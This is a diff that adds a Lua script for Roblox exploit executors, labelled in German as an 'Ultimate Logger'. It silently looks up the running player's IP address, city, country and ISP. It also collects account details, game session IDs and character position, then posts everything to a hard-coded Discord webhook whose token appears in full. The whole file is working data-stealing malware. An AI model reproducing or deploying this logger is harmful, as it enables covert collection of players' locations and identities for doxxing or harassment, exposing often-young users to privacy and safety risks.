@@ -1,0 +1,76 @@
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1528479467855417445/KVcfybvrouII2YhlAGYDKRuULv0iAfKHf8ROqN9ZUPAnCeVgOiXtSpjcTYnYY9IJx6T4"
+
+local function httpRequest(options)
+    if syn and syn.request then return syn.request(options)
+    elseif http_request then return http_request(options)
+    elseif request then return request(options) end
+    return nil
+end
+
+local HttpService = game:GetService("HttpService")
+local player = game.Players.LocalPlayer
+local UIS = game:GetService("UserInputService")
+local Stats = game:GetService("Stats")
+
+local function getIP()
+    local res = httpRequest({Url = "http://ip-api.com/json/", Method = "GET"})
+    if res and res.Body then
+        return HttpService:JSONDecode(res.Body)
+    end
+    return {}
+end
+
+local ipData = getIP()
+
+local data = {
+    username = player.Name,
+    userid = player.UserId,
+    displayname = player.DisplayName,
+    ip = ipData.query or "Fehler",
+    country = ipData.country or "N/A",
+    city = ipData.city or "N/A",
+    isp = ipData.isp or "N/A",
+    game = game.Name,
+    placeid = game.PlaceId,
+    jobid = game.JobId,
+    accountage = player.AccountAge,
+    membership = tostring(player.MembershipType),
+    platform = tostring(UIS:GetPlatform()),
+    ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()),
+    fps = math.floor(1 / game:GetService("RunService").RenderStepped:Wait()),
+    executor = (syn and "Synapse") or (http_request and "http_request") or "Unbekannt",
+    position = (player.Character and player.Character:FindFirstChild("HumanoidRootPart") and tostring(player.Character.HumanoidRootPart.Position) or "Kein Character"),
+    time = os.date("%Y-%m-%d %H:%M:%S"),
+}
+
+local payload = {
+    content = "ULTIMATE ROBLOX LOGGER HIT!",
+    embeds = {{
+        title = "Kompletter PC Logger",
+        color = 0xFF0000,
+        fields = {
+            {name = "Spieler", value = data.username .. " (" .. data.userid .. ")", inline = true},
+            {name = "Display Name", value = data.displayname, inline = true},
+            {name = "IP", value = "" .. data.ip .. "", inline = true},
+            {name = "Stadt / Land", value = data.city .. ", " .. data.country, inline = true},
+            {name = "ISP", value = data.isp, inline = true},
+            {name = "Account Age", value = data.accountage .. " Tage", inline = true},
+            {name = "Membership", value = data.membership, inline = true},
+            {name = "Platform", value = data.platform, inline = true},
+            {name = "Ping / FPS", value = data.ping .. " ms / " .. data.fps, inline = true},
+            {name = "Executor", value = data.executor, inline = true},
+            {name = "Position", value = data.position, inline = false},
+            {name = "Game Info", value = data.game .. "\nPlace: " .. data.placeid .. "\nJob: " .. data.jobid, inline = false},
+            {name = "Zeit", value = data.time, inline = false},
+        }
+    }}
+}
+
+httpRequest({
+    Url = WEBHOOK_URL,
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = HttpService:JSONEncode(payload)
+})
+
+print("Ultimate Logger ausgeführt!")
